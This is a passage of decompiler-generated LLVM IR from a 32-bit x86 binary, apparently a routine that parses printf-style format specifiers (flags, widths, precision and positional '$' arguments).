  %v0_80515e4.ph94 = phi i32 [ %v1_80516f5, %dec_label_pc_80516f5 ], [ %v2_805157a, %dec_label_pc_805157a ], [ %v2_80515c0, %dec_label_pc_80515bb ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_80516f5 ], [ %tmp66, %dec_label_pc_805157a ], [ %tmp66, %dec_label_pc_80515bb ]
  %stack_var_-96.1.ph = phi i32 [ %v0_805157e, %dec_label_pc_80516f5 ], [ 0, %dec_label_pc_805157a ], [ 0, %dec_label_pc_80515bb ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_80516f5 ], [ %v3_8051568, %dec_label_pc_805157a ], [ %v3_8051568, %dec_label_pc_80515bb ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_80516f5 ], [ 0, %dec_label_pc_805157a ], [ 0, %dec_label_pc_80515bb ]
  %v7_80515df = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_80515df = trunc i64 %v7_80515df to i32
  %v2_80515e7 = add i32 %v8_80515df, 80
  br label %dec_label_pc_80515d8

dec_label_pc_80515d8:                             ; preds = %dec_label_pc_80515d8.outer, %dec_label_pc_8051695
  %v0_80515e4 = phi i32 [ %v0_80516a2, %dec_label_pc_8051695 ], [ %v0_80515e4.ph94, %dec_label_pc_80515d8.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8051695 ], [ %stack_var_-32.1.ph, %dec_label_pc_80515d8.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8051695 ], [ %stack_var_-88.1.ph, %dec_label_pc_80515d8.outer ]
  store i32 %v0_80515e4, i32* @edx, align 4
  %v1_80515d8 = inttoptr i32 %v0_80515e4 to i8*
  %v2_80515d8 = load i8, i8* %v1_80515d8, align 1
  %v11_80515d8 = icmp eq i8 %v2_80515d8, 42
  store i32 %v0_80515e4, i32* @esi, align 4
  %v1_80515dd = icmp eq i1 %v11_80515d8, false
  br i1 %v1_80515dd, label %dec_label_pc_80515ef, label %dec_label_pc_80515df

dec_label_pc_80515df:                             ; preds = %dec_label_pc_80515d8
  store i32 %v8_80515df, i32* %eax.global-to-local, align 4
  %v1_80515e4 = add i32 %v0_80515e4, 1
  store i32 %v1_80515e4, i32* @esi, align 4
  %v0_80515e7 = load i32, i32* @esp, align 4
  %v3_80515e7 = add i32 %v2_80515e7, %v0_80515e7
  %v4_80515e7 = inttoptr i32 %v3_80515e7 to i32*
  store i32 0, i32* %v4_80515e7, align 4
  %v0_8051609.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80515ef

dec_label_pc_80515ef:                             ; preds = %dec_label_pc_80515d8, %dec_label_pc_80515df
  %v0_8051609.pre = phi i32 [ %v0_80515e4, %dec_label_pc_80515d8 ], [ %v0_8051609.pre.pre, %dec_label_pc_80515df ]
  %v0_80515ef = load i32, i32* inttoptr (i32 134622656 to i32*), align 64
  store i32 %v0_80515ef, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8051609.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051609

dec_label_pc_80515f9:                             ; preds = %dec_label_pc_8051609
  %v1_80515f9 = add i32 %v1_8051601, -4094
  %v6_80515f9 = sub i32 4093, %v1_8051601
  %v7_80515f9 = and i32 %v6_80515f9, %v1_8051601
  %v8_80515f9 = icmp slt i32 %v7_80515f9, 0
  %v9_80515f9 = icmp eq i32 %v1_80515f9, 0
  %v10_80515f9 = icmp slt i32 %v1_80515f9, 0
  %v3_80515ff = icmp eq i1 %v10_80515f9, %v8_80515f9
  %v4_80515ff = icmp eq i1 %v9_80515f9, false
  %v5_80515ff = and i1 %v4_80515ff, %v3_80515ff
  br i1 %v5_80515ff, label %dec_label_pc_8051608, label %dec_label_pc_8051601

dec_label_pc_8051601:                             ; preds = %dec_label_pc_80515f9
  %v3_8051601 = mul i32 %v1_8051601, 10
  store i32 %v3_8051601, i32* %eax.global-to-local, align 4
  %v2_8051604 = add i32 %v3_8051601, -48
  %v3_8051604 = add i32 %v2_8051604, %v2_805160b
  store i32 %v3_8051604, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %dec_label_pc_80515f9, %dec_label_pc_8051601
  %v0_805162332 = phi i32 [ %v1_8051601, %dec_label_pc_80515f9 ], [ %v3_8051604, %dec_label_pc_8051601 ]
  %v4_805160928 = phi i32 [ %v6_8051609, %dec_label_pc_80515f9 ], [ %v3_8051601, %dec_label_pc_8051601 ]
  %v1_8051608 = add i32 %v0_8051608, 1
  store i32 %v1_8051608, i32* @esi, align 4
  br label %dec_label_pc_8051609

dec_label_pc_8051609:                             ; preds = %dec_label_pc_80515ef, %dec_label_pc_8051608
  %v1_8051601 = phi i32 [ 0, %dec_label_pc_80515ef ], [ %v0_805162332, %dec_label_pc_8051608 ]
  %v4_8051609 = phi i32 [ %v4_8051609.pre, %dec_label_pc_80515ef ], [ %v4_805160928, %dec_label_pc_8051608 ]
  %v0_8051608 = phi i32 [ %v0_8051609.pre, %dec_label_pc_80515ef ], [ %v1_8051608, %dec_label_pc_8051608 ]
  %v1_8051609 = inttoptr i32 %v0_8051608 to i8*
  %v2_8051609 = load i8, i8* %v1_8051609, align 1
  %v3_8051609 = zext i8 %v2_8051609 to i32
  %v5_8051609 = and i32 %v4_8051609, -256
  %v6_8051609 = or i32 %v3_8051609, %v5_8051609
  store i32 %v6_8051609, i32* %eax.global-to-local, align 4
  %v2_805160b = sext i8 %v2_8051609 to i32
  store i32 %v2_805160b, i32* @ecx, align 4
  %v2_805160e = mul nsw i32 %v2_805160b, 2
  %v3_805160e = add i32 %v2_805160e, %v0_80515ef
  %v4_805160e = inttoptr i32 %v3_805160e to i8*
  %v5_805160e = load i8, i8* %v4_805160e, align 1
  %v6_805160e = and i8 %v5_805160e, 8
  %v7_805160e = icmp eq i8 %v6_805160e, 0
  %v1_8051613 = icmp eq i1 %v7_805160e, false
  br i1 %v1_8051613, label %dec_label_pc_80515f9, label %dec_label_pc_8051615

dec_label_pc_8051615:                             ; preds = %dec_label_pc_8051609
  %v0_8051615 = load i32, i32* @edx, align 4
  %v1_8051615 = add i32 %v0_8051615, -1
  %v2_8051615 = inttoptr i32 %v1_8051615 to i8*
  %v3_8051615 = load i8, i8* %v2_8051615, align 1
  %v12_8051615 = icmp eq i8 %v3_8051615, 37
  %v1_8051619 = icmp eq i1 %v12_8051615, false
  br i1 %v1_8051619, label %dec_label_pc_80516ac, label %dec_label_pc_805161f

dec_label_pc_805161f:                             ; preds = %dec_label_pc_8051615
  %v10_805161f = icmp eq i8 %v2_8051609, 36
  %v1_8051621 = icmp eq i1 %v10_805161f, false
  br i1 %v1_8051621, label %dec_label_pc_8051653, label %dec_label_pc_8051623

dec_label_pc_8051623:                             ; preds = %dec_label_pc_805161f
  %tmp89 = icmp slt i32 %v1_8051601, 1
  br i1 %tmp89, label %dec_label_pc_8051653, label %dec_label_pc_8051627

dec_label_pc_8051627:                             ; preds = %dec_label_pc_8051623
  %v4_8051627 = icmp eq i32 %stack_var_-88.1, 0
  %v1_805162c = add i32 %v0_8051608, 1
  store i32 %v1_805162c, i32* @edx, align 4
  br i1 %v4_8051627, label %dec_label_pc_80518fd, label %dec_label_pc_8051635

dec_label_pc_8051635:                             ; preds = %dec_label_pc_8051627
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_805163d = sub i32 %v1_8051601, %stack_var_-88.1
  %v8_805163d = xor i32 %v1_8051601, %stack_var_-88.1
  %v9_805163d = xor i32 %v2_805163d, %v1_8051601
  %v10_805163d = and i32 %v9_805163d, %v8_805163d
  %v11_805163d = icmp slt i32 %v10_805163d, 0
  %v12_805163d = icmp eq i32 %v2_805163d, 0
  %v13_805163d = icmp slt i32 %v2_805163d, 0
  %v3_805163f = icmp ne i1 %v13_805163d, %v11_805163d
  %v4_805163f = or i1 %v12_805163d, %v3_805163f
  %stack_var_-88.1.v0_8051641 = select i1 %v4_805163f, i32 %stack_var_-88.1, i32 %v1_8051601
  br label %dec_label_pc_805164f

dec_label_pc_805164f:                             ; preds = %dec_label_pc_8051663, %dec_label_pc_8051635, %dec_label_pc_8051667
  %v0_805164f = phi i32 [ %v1_805162c, %dec_label_pc_8051635 ], [ %v0_8051615, %dec_label_pc_8051667 ], [ %v0_8051615, %dec_label_pc_8051663 ]
  %stack_var_-32.2 = phi i32 [ %v1_8051601, %dec_label_pc_8051635 ], [ %stack_var_-32.1, %dec_label_pc_8051667 ], [ %stack_var_-32.1, %dec_label_pc_8051663 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8051641, %dec_label_pc_8051635 ], [ 0, %dec_label_pc_8051667 ], [ 0, %dec_label_pc_8051663 ]
  store i32 %v0_805164f, i32* @esi, align 4
  br label %dec_label_pc_8051676

dec_label_pc_8051653:                             ; preds = %dec_label_pc_8051623, %dec_label_pc_805161f
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_8051663, label %dec_label_pc_805165a

dec_label_pc_805165a:                             ; preds = %dec_label_pc_8051653
  %v10_805165a = icmp eq i8 %v2_8051609, 109
  br i1 %v10_805165a, label %dec_label_pc_80516ac, label %dec_label_pc_80518fd

dec_label_pc_8051663:                             ; preds = %dec_label_pc_8051653
  %tmp153 = icmp ugt i32 %v0_8051608, %v0_8051615
  br i1 %tmp153, label %dec_label_pc_8051667, label %dec_label_pc_805164f

dec_label_pc_8051667:                             ; preds = %dec_label_pc_8051663
  %v1_8051667 = inttoptr i32 %v0_8051615 to i8*
  %v2_8051667 = load i8, i8* %v1_8051667, align 1
  %v8_8051667 = icmp eq i8 %v2_8051667, 48
  br i1 %v8_8051667, label %dec_label_pc_805164f, label %dec_label_pc_80516ac

dec_label_pc_8051676:                             ; preds = %dec_label_pc_8051687, %dec_label_pc_805164f
  %v0_80516a2 = phi i32 [ %v1_8051687, %dec_label_pc_8051687 ], [ %v0_805164f, %dec_label_pc_805164f ]
  %v4_805168035 = phi i32 [ %v6_8051680, %dec_label_pc_8051687 ], [ %v6_8051609, %dec_label_pc_805164f ]
  store i32 ptrtoint ([8 x i8]* @global_var_805b936.220 to i32), i32* %edx.global-to-local, align 4
  %v1_8051683 = inttoptr i32 %v0_80516a2 to i8*
  br label %dec_label_pc_8051680

dec_label_pc_8051680:                             ; preds = %dec_label_pc_8051691, %dec_label_pc_8051676
  %v4_8051680 = phi i32 [ %v4_805168035, %dec_label_pc_8051676 ], [ %v6_8051680, %dec_label_pc_8051691 ]
  %v0_8051682 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805b936.220 to i32), %dec_label_pc_8051676 ], [ %v1_8051682, %dec_label_pc_8051691 ]
  %v0_8051691 = phi i32 [ 1, %dec_label_pc_8051676 ], [ %v2_8051691, %dec_label_pc_8051691 ]
  store i32 %v0_8051691, i32* @ecx, align 4
  %v1_8051680 = inttoptr i32 %v0_8051682 to i8*
  %v2_8051680 = load i8, i8* %v1_8051680, align 1
  %v3_8051680 = zext i8 %v2_8051680 to i32
  %v5_8051680 = and i32 %v4_8051680, -256
  %v6_8051680 = or i32 %v3_8051680, %v5_8051680
  store i32 %v6_8051680, i32* %eax.global-to-local, align 4
  %v1_8051682 = add i32 %v0_8051682, 1
  store i32 %v1_8051682, i32* @edx, align 4
  %v2_8051683 = load i8, i8* %v1_8051683, align 1
  %v15_8051683 = icmp eq i8 %v2_8051683, %v2_8051680
  %v1_8051685 = icmp eq i1 %v15_8051683, false
  br i1 %v1_8051685, label %dec_label_pc_805168c, label %dec_label_pc_8051687

dec_label_pc_8051687:                             ; preds = %dec_label_pc_8051680
  %v1_8051687 = add i32 %v0_80516a2, 1
  store i32 %v1_8051687, i32* @esi, align 4
  %v0_8051688 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051688 = or i32 %v0_8051688, %v0_8051691
  store i32 %v2_8051688, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051676

dec_label_pc_805168c:                             ; preds = %dec_label_pc_8051680
  %v1_805168c = inttoptr i32 %v1_8051682 to i8*
  %v2_805168c = load i8, i8* %v1_805168c, align 1
  %v3_805168c = icmp eq i8 %v2_805168c, 0
  br i1 %v3_805168c, label %dec_label_pc_8051695, label %dec_label_pc_8051691

dec_label_pc_8051691:                             ; preds = %dec_label_pc_805168c
  %v2_8051691 = mul i32 %v0_8051691, 2
  br label %dec_label_pc_8051680

dec_label_pc_8051695:                             ; preds = %dec_label_pc_805168c
  %v0_8051695 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051699 = udiv i32 %v0_8051695, 2
  %v1_8051699.not = or i32 %v1_8051699, -6
  %v1_805169e = xor i32 %v1_8051699.not, 5
  store i32 %v1_805169e, i32* %eax.global-to-local, align 4
  %v2_80516a0 = and i32 %v1_805169e, %v0_8051695
  store i32 %v2_80516a0, i32* %edi.global-to-local, align 4
  %v1_80516a2 = add i32 %v0_80516a2, -1
  %v2_80516a2 = inttoptr i32 %v1_80516a2 to i8*
  %v3_80516a2 = load i8, i8* %v2_80516a2, align 1
  %v12_80516a2 = icmp eq i8 %v3_80516a2, 37
  %v1_80516a6 = icmp eq i1 %v12_80516a2, false
  br i1 %v1_80516a6, label %dec_label_pc_80515d8, label %dec_label_pc_80516ac

dec_label_pc_80516ac:                             ; preds = %dec_label_pc_8051667, %dec_label_pc_8051695, %dec_label_pc_8051615, %dec_label_pc_805165a
  %v0_80516cf = phi i32 [ %v1_8051601, %dec_label_pc_805165a ], [ %v1_8051601, %dec_label_pc_8051667 ], [ 0, %dec_label_pc_8051695 ], [ %v1_8051601, %dec_label_pc_8051615 ]
  %v1_80516d8 = phi i32 [ %v0_8051608, %dec_label_pc_805165a ], [ %v0_8051608, %dec_label_pc_8051667 ], [ %v0_80516a2, %dec_label_pc_8051695 ], [ %v0_8051608, %dec_label_pc_8051615 ]
  %v0_80516d5 = phi i32 [ %v0_8051615, %dec_label_pc_805165a ], [ %v0_8051615, %dec_label_pc_8051667 ], [ %v1_8051682, %dec_label_pc_8051695 ], [ %v0_8051615, %dec_label_pc_8051615 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_805165a ], [ %stack_var_-32.1, %dec_label_pc_8051667 ], [ %stack_var_-32.2, %dec_label_pc_8051695 ], [ %stack_var_-32.1, %dec_label_pc_8051615 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_805165a ], [ 0, %dec_label_pc_8051667 ], [ %stack_var_-88.2, %dec_label_pc_8051695 ], [ %stack_var_-88.1, %dec_label_pc_8051615 ]
  %v1_80516ac = inttoptr i32 %v0_80516d5 to i8*
  %v2_80516ac = load i8, i8* %v1_80516ac, align 1
  %v11_80516ac = icmp eq i8 %v2_80516ac, 42
  %v1_80516af = icmp eq i1 %v11_80516ac, false
  br i1 %v1_80516af, label %dec_label_pc_80516e5, label %dec_label_pc_80516b1

dec_label_pc_80516b1:                             ; preds = %dec_label_pc_80516ac
  %v4_80516b1 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_80516b1, label %dec_label_pc_80516d5, label %dec_label_pc_80516b8

dec_label_pc_80516b8:                             ; preds = %dec_label_pc_80516b1
  %v1_80516b8 = inttoptr i32 %v1_80516d8 to i8*
  %v2_80516b8 = load i8, i8* %v1_80516b8, align 1
  %v11_80516b8 = icmp eq i8 %v2_80516b8, 36
  %v1_80516bb = icmp eq i1 %v11_80516b8, false
  br i1 %v1_80516bb, label %dec_label_pc_80518fd, label %dec_label_pc_80516c1

dec_label_pc_80516c1:                             ; preds = %dec_label_pc_80516b8
  %tmp91 = icmp slt i32 %v0_80516cf, 1
  br i1 %tmp91, label %dec_label_pc_80518fd, label %dec_label_pc_80516c9

dec_label_pc_80516c9:                             ; preds = %dec_label_pc_80516c1
  store i32 %v8_80515df, i32* %eax.global-to-local, align 4
  %v1_80516ce = add i32 %v1_80516d8, 1
  store i32 %v1_80516ce, i32* @esi, align 4
  %v1_80516cf = load i32, i32* @esp, align 4
  %v3_80516cf = add i32 %v8_80515df, 68
  %v4_80516cf = add i32 %v3_80516cf, %v1_80516cf
  %v5_80516cf = inttoptr i32 %v4_80516cf to i32*
  store i32 %v0_80516cf, i32* %v5_80516cf, align 4
  %v0_8051713.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80516e0

dec_label_pc_80516d5:                             ; preds = %dec_label_pc_80516b1
  %v1_80516d5 = add i32 %v0_80516d5, 1
  store i32 %v1_80516d5, i32* %eax.global-to-local, align 4
  %v12_80516d8 = icmp eq i32 %v1_80516d5, %v1_80516d8
  %v1_80516da = icmp eq i1 %v12_80516d8, false
  br i1 %v1_80516da, label %dec_label_pc_80518fd, label %dec_label_pc_80516e0

dec_label_pc_80516e0:                             ; preds = %dec_label_pc_80516d5, %dec_label_pc_80516c9
  %v0_8051713.pre.pre.pre = phi i32 [ %v1_80516d8, %dec_label_pc_80516d5 ], [ %v0_8051713.pre.pre.pre.pre, %dec_label_pc_80516c9 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80516e5

dec_label_pc_80516e5:                             ; preds = %dec_label_pc_80516ac, %dec_label_pc_80516e0
  %v0_8051713.pre.pre = phi i32 [ %v1_80516d8, %dec_label_pc_80516ac ], [ %v0_8051713.pre.pre.pre, %dec_label_pc_80516e0 ]
  %v0_805157e = phi i32 [ %v0_80516cf, %dec_label_pc_80516ac ], [ -2147483648, %dec_label_pc_80516e0 ]
  %v4_80516e5 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_80516e5 = icmp eq i32 %v4_80516e5, 0
  %v1_80516ea = icmp eq i1 %v5_80516e5, false
  %.pre = inttoptr i32 %v0_8051713.pre.pre to i8*
  br i1 %v1_80516ea, label %dec_label_pc_805170e, label %dec_label_pc_80516f0

dec_label_pc_80516f0:                             ; preds = %dec_label_pc_80516e5
  %v2_80516f0 = load i8, i8* %.pre, align 1
  %v11_80516f0 = icmp eq i8 %v2_80516f0, 46
  %v1_80516f3 = icmp eq i1 %v11_80516f0, false
  br i1 %v1_80516f3, label %dec_label_pc_8051707, label %dec_label_pc_80516f5

dec_label_pc_80516f5:                             ; preds = %dec_label_pc_80516f0
  %v1_80516f5 = add i32 %v0_8051713.pre.pre, 1
  store i32 %v1_80516f5, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80515d8.outer

dec_label_pc_8051707:                             ; preds = %dec_label_pc_80516f0
  br label %dec_label_pc_805170e

dec_label_pc_805170e:                             ; preds = %dec_label_pc_80516e5, %dec_label_pc_8051707
  %stack_var_-96.2 = phi i32 [ %v0_805157e, %dec_label_pc_8051707 ], [ %stack_var_-96.1.ph, %dec_label_pc_80516e5 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8051707 ], [ %v0_805157e, %dec_label_pc_80516e5 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805b8e4.221 to i32), i32* @edx, align 4
  %v4_8051713.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051713

dec_label_pc_8051713:                             ; preds = %dec_label_pc_805171d, %dec_label_pc_805170e
  %v0_805171d = phi i32 [ %v1_805171d, %dec_label_pc_805171d ], [ ptrtoint ([9 x i8]* @global_var_805b8e4.221 to i32), %dec_label_pc_805170e ]
  %v4_8051713 = phi i32 [ %v6_8051713, %dec_label_pc_805171d ], [ %v4_8051713.pre, %dec_label_pc_805170e ]
  %v2_8051713 = load i8, i8* %.pre, align 1
  %v3_8051713 = zext i8 %v2_8051713 to i32
  %v5_8051713 = and i32 %v4_8051713, -256
  %v6_8051713 = or i32 %v3_8051713, %v5_8051713
  store i32 %v6_8051713, i32* %eax.global-to-local, align 4
  %v3_8051715 = inttoptr i32 %v0_805171d to i8*
  %v4_8051715 = load i8, i8* %v3_8051715, align 1
  %v15_8051715 = icmp eq i8 %v2_8051713, %v4_8051715
  br i1 %v15_8051715, label %dec_label_pc_8051585, label %dec_label_pc_805171d

dec_label_pc_805171d:                             ; preds = %dec_label_pc_8051713
  %v1_805171d = add i32 %v0_805171d, 1
  store i32 %v1_805171d, i32* @edx, align 4
  %v1_805171e = inttoptr i32 %v1_805171d to i8*
  %v2_805171e = load i8, i8* %v1_805171e, align 1
  %v3_805171e = icmp eq i8 %v2_805171e, 0
  %v1_8051721 = icmp eq i1 %v3_805171e, false
  br i1 %v1_8051721, label %dec_label_pc_8051713, label %dec_label_pc_8051723

dec_label_pc_8051723:                             ; preds = %dec_label_pc_805171d, %dec_label_pc_8051585
  %v0_8051736 = phi i32 [ %v1_8051585, %dec_label_pc_8051585 ], [ %v0_8051713.pre.pre, %dec_label_pc_805171d ]
  %v0_8051733 = phi i32 [ %v0_805171d, %dec_label_pc_8051585 ], [ %v1_805171d, %dec_label_pc_805171d ]
  %v1_8051725 = add i32 %v0_8051733, -134592740
  %v1_805172a = add i32 %v0_8051733, -134592741
  %v5_805172a = sub i32 134592740, %v0_8051733
  %v6_805172a = and i32 %v1_8051725, %v5_805172a
  %v7_805172a = icmp slt i32 %v6_805172a, 0
  %v8_805172a = icmp eq i32 %v1_805172a, 0
  %v9_805172a = icmp slt i32 %v1_805172a, 0
  store i32 %v1_805172a, i32* %eax.global-to-local, align 4
  %v3_805172b = icmp eq i1 %v9_805172a, %v7_805172a
  %v4_805172b = icmp eq i1 %v8_805172a, false
  %v5_805172b = and i1 %v4_805172b, %v3_805172b
  br i1 %v5_805172b, label %dec_label_pc_8051737, label %dec_label_pc_805172d

dec_label_pc_805172d:                             ; preds = %dec_label_pc_8051723
  %v1_805172d = inttoptr i32 %v0_8051736 to i8*
  %v2_805172d = load i8, i8* %v1_805172d, align 1
  %v3_805172d = zext i8 %v2_805172d to i32
  %v5_805172d = and i32 %v1_805172a, -256
  %v6_805172d = or i32 %v3_805172d, %v5_805172d
  store i32 %v6_805172d, i32* %eax.global-to-local, align 4
  %v3_805172f = inttoptr i32 %v0_8051733 to i8*
  %v4_805172f = load i8, i8* %v3_805172f, align 1
  %v15_805172f = icmp eq i8 %v2_805172d, %v4_805172f
  %v1_8051731 = icmp eq i1 %v15_805172f, false
  br i1 %v1_8051731, label %dec_label_pc_8051737, label %dec_label_pc_8051733

dec_label_pc_8051733:                             ; preds = %dec_label_pc_805172d
  %v1_8051733 = add i32 %v0_8051733, 9
  store i32 %v1_8051733, i32* @edx, align 4
  %v1_8051736 = add i32 %v0_8051736, 1
  store i32 %v1_8051736, i32* @esi, align 4
  br label %dec_label_pc_8051737

dec_label_pc_8051737:                             ; preds = %dec_label_pc_805172d, %dec_label_pc_8051723, %dec_label_pc_8051733
  %v4_805173b = phi i32 [ %v6_805172d, %dec_label_pc_805172d ], [ %v1_805172a, %dec_label_pc_8051723 ], [ %v6_805172d, %dec_label_pc_8051733 ]
  %v0_805173b = phi i32 [ %v0_8051736, %dec_label_pc_805172d ], [ %v0_8051736, %dec_label_pc_8051723 ], [ %v1_8051736, %dec_label_pc_8051733 ]
  %v0_8051737 = phi i32 [ %v0_8051733, %dec_label_pc_805172d ], [ %v0_8051733, %dec_label_pc_8051723 ], [ %v1_8051733, %dec_label_pc_8051733 ]
  %v1_8051737 = add i32 %v0_8051737, 9
  %v2_8051737 = inttoptr i32 %v1_8051737 to i8*
  %v3_8051737 = load i8, i8* %v2_8051737, align 1
  %v4_8051737 = sext i8 %v3_8051737 to i32
  store i32 %v4_8051737, i32* %ebx.global-to-local, align 4
  %v1_805173b = inttoptr i32 %v0_805173b to i8*
  %v2_805173b = load i8, i8* %v1_805173b, align 1
  %v3_805173b = zext i8 %v2_805173b to i32
  %v5_805173b = and i32 %v4_805173b, -256
  %v6_805173b = or i32 %v3_805173b, %v5_805173b
  store i32 %v6_805173b, i32* %eax.global-to-local, align 4
  %v2_805173d = mul nsw i32 %v4_8051737, 256
  store i32 %v2_805173d, i32* %ebx.global-to-local, align 4
  %v4_8051740 = icmp eq i8 %v2_805173b, 0
  br i1 %v4_8051740, label %dec_label_pc_80518fd, label %dec_label_pc_8051748

dec_label_pc_8051748:                             ; preds = %dec_label_pc_8051737
  %v3_8051748 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051748, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_805b921.222 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051751

dec_label_pc_8051751:                             ; preds = %dec_label_pc_80517a1, %dec_label_pc_8051748
  %v0_80517a1 = phi i32 [ %v1_80517a1, %dec_label_pc_80517a1 ], [ ptrtoint ([21 x i8]* @global_var_805b921.222 to i32), %dec_label_pc_8051748 ]
  %v3_8051751 = inttoptr i32 %v0_80517a1 to i8*
  %v4_8051751 = load i8, i8* %v3_8051751, align 1
  %v15_8051751 = icmp eq i8 %v2_805173b, %v4_8051751
  %v1_8051753 = icmp eq i1 %v15_8051751, false
  br i1 %v1_8051753, label %dec_label_pc_80517a1, label %dec_label_pc_8051755

dec_label_pc_8051755:                             ; preds = %dec_label_pc_8051751
  %v1_8051757 = add i32 %v0_80517a1, -134592801
  store i32 %v1_8051757, i32* %edx.global-to-local, align 4
  %v7_8051760 = icmp sgt i32 %v1_8051757, 17
  br i1 %v7_8051760, label %dec_label_pc_8051762, label %dec_label_pc_805176b

dec_label_pc_8051762:                             ; preds = %dec_label_pc_8051755
  %v1_8051762 = add i32 %v0_80517a1, -134592803
  store i32 %v1_8051762, i32* %eax.global-to-local, align 4
  %v3_8051765 = and i32 %v2_805173d, 1024
  %v4_8051765 = icmp eq i32 %v3_8051765, 0
  %v1_8051768 = icmp eq i1 %v4_8051765, false
  %v4_8051768 = select i1 %v1_8051768, i32 %v1_8051762, i32 %v1_8051757
  store i32 %v4_8051768, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805176b

dec_label_pc_805176b:                             ; preds = %dec_label_pc_8051755, %dec_label_pc_8051762
  %v0_8051774 = phi i32 [ %v1_8051757, %dec_label_pc_8051755 ], [ %v4_8051768, %dec_label_pc_8051762 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b917.223 to i32), i32* %ecx.global-to-local, align 4
  %v2_8051774 = add i32 %tmp76, 32
  %v3_8051774 = inttoptr i32 %v2_8051774 to i32*
  store i32 %v0_8051774, i32* %v3_8051774, align 4
  %v0_8051777.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805177b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051777

dec_label_pc_8051777:                             ; preds = %dec_label_pc_8051777, %dec_label_pc_805176b
  %v0_8051777 = phi i32 [ %v1_8051777, %dec_label_pc_8051777 ], [ %v0_8051777.pre, %dec_label_pc_805176b ]
  %v1_8051777 = add i32 %v0_8051777, 1
  store i32 %v1_8051777, i32* %ecx.global-to-local, align 4
  %v1_8051778 = inttoptr i32 %v1_8051777 to i8*
  %v2_8051778 = load i8, i8* %v1_8051778, align 1
  %v3_8051778 = sext i8 %v2_8051778 to i32
  store i32 %v3_8051778, i32* %eax.global-to-local, align 4
  %v8_805177d = icmp sgt i32 %v0_805177b.pre, %v3_8051778
  br i1 %v8_805177d, label %dec_label_pc_8051777, label %dec_label_pc_805177f

dec_label_pc_805177f:                             ; preds = %dec_label_pc_8051777
  store i32 ptrtoint ([21 x i8]* @global_var_805b921.222 to i32), i32* @ecx, align 4
  %v1_8051786 = add i32 %v0_8051777, -134592791
  store i32 %v1_8051786, i32* %eax.global-to-local, align 4
  %v2_805178b = add i32 %v0_8051777, add (i32 ptrtoint (i32* @global_var_805b908.224 to i32), i32 -134592791)
  %v3_805178b = add i32 %v2_805178b, %v1_8051786
  %v4_805178b = inttoptr i32 %v3_805178b to i16*
  %v5_805178b = load i16, i16* %v4_805178b, align 2
  %v6_805178b = sext i16 %v5_805178b to i32
  store i32 %v6_805178b, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8051786, 2
  %v3_8051793 = add i32 %factor, 134592760
  %v4_8051793 = inttoptr i32 %v3_8051793 to i16*
  %v5_8051793 = load i16, i16* %v4_8051793, align 2
  %v6_8051793 = sext i16 %v5_8051793 to i32
  store i32 %v6_8051793, i32* %eax.global-to-local, align 4
  %v1_805179b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805179b = or i32 %v1_805179b, %v6_805178b
  %v2_805179d = and i32 %v2_805179b, %v6_8051793
  store i32 %v2_805179d, i32* %edx.global-to-local, align 4
  %v0_80517af.pre = load i32, i32* @esi, align 4
  %v0_80517b2.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80517a7

dec_label_pc_80517a1:                             ; preds = %dec_label_pc_8051751
  %v1_80517a1 = add i32 %v0_80517a1, 1
  store i32 %v1_80517a1, i32* @ecx, align 4
  %v1_80517a2 = inttoptr i32 %v1_80517a1 to i8*
  %v2_80517a2 = load i8, i8* %v1_80517a2, align 1
  %v3_80517a2 = icmp eq i8 %v2_80517a2, 0
  %v1_80517a5 = icmp eq i1 %v3_80517a2, false
  br i1 %v1_80517a5, label %dec_label_pc_8051751, label %dec_label_pc_80517a7

dec_label_pc_80517a7:                             ; preds = %dec_label_pc_80517a1, %dec_label_pc_805177f
  %v0_80517b2 = phi i32 [ %v0_80517b2.pre, %dec_label_pc_805177f ], [ %storemerge4, %dec_label_pc_80517a1 ]
  %v0_80517af = phi i32 [ %v0_80517af.pre, %dec_label_pc_805177f ], [ %v0_805173b, %dec_label_pc_80517a1 ]
